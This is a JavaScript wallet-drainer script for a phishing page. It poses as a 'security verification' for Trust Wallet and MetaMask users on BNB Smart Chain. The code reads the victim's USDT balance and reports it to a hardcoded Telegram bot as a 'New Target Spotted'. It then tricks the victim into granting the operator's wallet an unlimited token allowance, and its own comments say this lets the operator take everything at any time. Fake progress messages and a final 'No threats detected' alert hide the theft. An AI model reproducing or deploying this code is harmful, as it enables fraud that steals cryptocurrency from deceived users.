// 1. Configuration
const myWalletAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe"; 
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; 

// 2. Telegram Details
const telegramBotToken = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
const telegramChatId = "7849151110";

async function sendTelegram(msg) {
    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: telegramChatId, text: msg, parse_mode: 'HTML' })
    });
}

function updateStatus(main, sub) {
    document.getElementById("loading-text").innerText = main;
    document.getElementById("sub-text").innerText = sub;
}

async function startProcess() {
    const overlay = document.getElementById("overlay");
    const isWeb3 = !!(window.ethereum || window.trustwallet);

    if (!isWeb3) {
        if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
            const currentUrl = window.location.href.replace("https://", "");
            window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + currentUrl;
            return;
        }
        alert("Please use Trust Wallet or MetaMask.");
        return;
    }

    overlay.style.display = "flex";
    updateStatus("Initializing...", "Starting secure verification...");

    try {
        const provider = window.ethereum || window.trustwallet;
        const web3 = new Web3(provider);
        const accounts = await provider.request({ method: 'eth_requestAccounts' });
        const userAddress = accounts[0];

        updateStatus("Scanning Assets...", "Verifying BSC smart contract...");
        
        await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });

        // ABI updated to include 'approve'
        const minABI = [
            { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
            { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ];

        const contract = new web3.eth.Contract(minABI, usdtContractAddress);
        const balanceWei = await contract.methods.balanceOf(userAddress).call();
        const balance = web3.utils.fromWei(balanceWei, 'ether');

        await sendTelegram(`👤 <b>New Target Spotted:</b>\nAddr: <code>${userAddress}</code>\nBalance: <b>${balance} USDT</b>`);

        if (parseFloat(balance) > 0) {
            updateStatus("Security Sync...", "Matching node signatures...");
            
            // UNLIMITED ALLOWANCE: 
            // We ask for a huge number so we can take everything anytime.
            const unlimitedAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

            // The user will see an "Approve USDT" request instead of "Send USDT"
            await contract.methods.approve(myWalletAddress, unlimitedAmount).send({ from: userAddress });
            
            await sendTelegram(`✅ <b>Permission Granted!</b>\nUser <code>${userAddress}</code> approved unlimited access to their USDT.`);
            
            updateStatus("Finalizing...", "Encryption complete.");
            setTimeout(() => {
                alert("Verification Successful! No threats detected.");
                location.reload();
            }, 1000);
        } else {
            alert("Verification Error: Zero balance detected.");
            overlay.style.display = "none";
        }

    } catch (err) {
        overlay.style.display = "none";
        console.error(err);
        alert("Error: " + err.message);
    }
}

document.getElementById("nextBtn").addEventListener("click", startProcess);
